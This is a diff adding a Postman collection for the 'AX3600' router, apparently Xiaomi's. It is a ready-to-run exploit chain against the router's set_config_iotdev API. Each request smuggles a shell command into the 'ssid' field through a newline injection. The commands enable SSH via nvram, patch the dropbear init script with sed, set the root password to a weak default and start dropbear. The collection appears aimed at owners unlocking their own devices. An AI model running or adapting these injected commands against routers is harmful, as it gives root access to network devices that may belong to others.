@@ -1,0 +1,331 @@
+{
+	"info": {
+		"_postman_id": "fda2354c-c7fd-46bb-8db2-9a61b8023f34",
+		"name": "AX3600",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "check_rom_update",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/xqsystem/check_rom_update",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"xqsystem",
+						"check_rom_update"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(1) nvram set ssh_en=1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Anvram%20set%20ssh%5Fen%3D1%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0Anvram%20set%20ssh%5Fen%3D1%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(2) nvram commit",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Anvram%20commit%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0Anvram%20commit%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(3) cp /etc/init.d/dropbear /etc/init.d/dropbear_backup",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acp%20%2Fetc%2Finit.d%2Fdropbear%20%2Fetc%2Finit.d%2Fdropbear_backup%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0Acp%20%2Fetc%2Finit.d%2Fdropbear%20%2Fetc%2Finit.d%2Fdropbear_backup%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(4) sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Ased%20-i%20'%2Fflg_ssh.*release%2F%20%7B%20%3Aa%3B%20N%3B%20%2Ffi%2F!%20ba%20%7D%3B%2Freturn%200%2Fd'%20%2Fetc%2Finit.d%2Fdropbear%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0Ased%20-i%20'%2Fflg_ssh.*release%2F%20%7B%20%3Aa%3B%20N%3B%20%2Ffi%2F!%20ba%20%7D%3B%2Freturn%200%2Fd'%20%2Fetc%2Finit.d%2Fdropbear%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(5) echo -e “<PASSWORD>/n<PASSWORD>” | passwd root",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Aecho%20-e%20%27{{ssh_password}}%5Cn{{ssh_password}}%27%20%7C%20passwd%20root%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0Aecho%20-e%20%27{{ssh_password}}%5Cn{{ssh_password}}%27%20%7C%20passwd%20root%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(6) /etc/init.d/dropbear enable",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20enable%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "gallifrey"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0A%2Fetc%2Finit.d%2Fdropbear%20enable%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "(7) /etc/init.d/dropbear start",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{gateway_ip}}/cgi-bin/luci/;stok={{stok}}/api/misystem/set_config_iotdev?bssid=doctor&user_id=doctor&ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A",
+					"protocol": "http",
+					"host": [
+						"{{gateway_ip}}"
+					],
+					"path": [
+						"cgi-bin",
+						"luci",
+						";stok={{stok}}",
+						"api",
+						"misystem",
+						"set_config_iotdev"
+					],
+					"query": [
+						{
+							"key": "bssid",
+							"value": "doctor"
+						},
+						{
+							"key": "user_id",
+							"value": "doctor"
+						},
+						{
+							"key": "ssid",
+							"value": "-h%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"id": "ce7434df-3044-4e50-aa74-8177c81f784e",
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"id": "65a1b9b9-dfa6-4f38-89ed-2e3a0e10a6eb",
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"id": "94fc9695-59de-45df-be55-35f5994155e7",
+			"key": "stok",
+			"value": "<STOK>"
+		},
+		{
+			"id": "d5473bd9-39b8-4328-abb7-ca72222e5156",
+			"key": "gateway_ip",
+			"value": "192.168.31.1"
+		},
+		{
+			"id": "63e7dd55-627f-4fcd-8cfb-206de1efe0f8",
+			"key": "ssh_password",
+			"value": "12345678"
+		}
+	],
+	"protocolProfileBehavior": {}
+}
